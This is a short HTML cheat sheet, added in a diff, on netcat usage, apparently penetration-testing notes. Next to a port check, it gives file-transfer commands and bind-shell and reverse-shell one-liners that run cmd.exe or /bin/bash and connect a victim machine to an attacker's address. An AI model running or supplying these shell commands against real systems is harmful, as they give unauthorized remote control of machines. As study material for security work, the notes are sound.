@@ -1,0 +1,54 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>netcat</title>
+</head><body><br/>
+Use for:<br/>
+1. Check if a port is open or closed<br/>
+2. Read a banner from the service listening on a port.<br/>
+3. Connect to a network service manually.<br/>
+<br/>
+<br/>
+<br/>
+<b>check port</b><br/>
+<br/>
+nc -nv &lt;ip&gt; &lt;port&gt;<br/>
+<br/>
+<br/>
+<br/>
+<b>transfer file</b><br/>
+<br/>
+<i>receive</i><br/>
+nc -lvnp 4444 &gt; incoming.exe<br/>
+<br/>
+<i>send</i><br/>
+<br/>
+nc -nv &lt;ip receive&gt; 4444 &lt; /tmp/shell.exe<br/>
+<br/>
+<br/>
+<b>bind shell</b><br/>
+<br/>
+victim<br/>
+nc -lvnp 443 -e cmd.exe<br/>
+nc -lvnp 443 -e /bin/bash<br/>
+<br/>
+attacker<br/>
+<br/>
+nc -nv &lt;ip victim&gt; 443<br/>
+<br/>
+<b>reverse shell</b><br/>
+<br/>
+attacker<br/>
+nc -lvnp 443<br/>
+<br/>
+victim<br/>
+nc -nv &lt;ip attacker&gt; 443 -e cmd.exe<br/>
+nc -nv &lt;ip attacker&gt; 443 -e /bin/bash<br/>
+<br/>
+<br/>
+note:<br/>
+-n -&gt; disable DNS name resolution<br/>
+-v -&gt; verbose<br/>
+-p -&gt; port<br/>
+-l -&gt; listener</body></html>
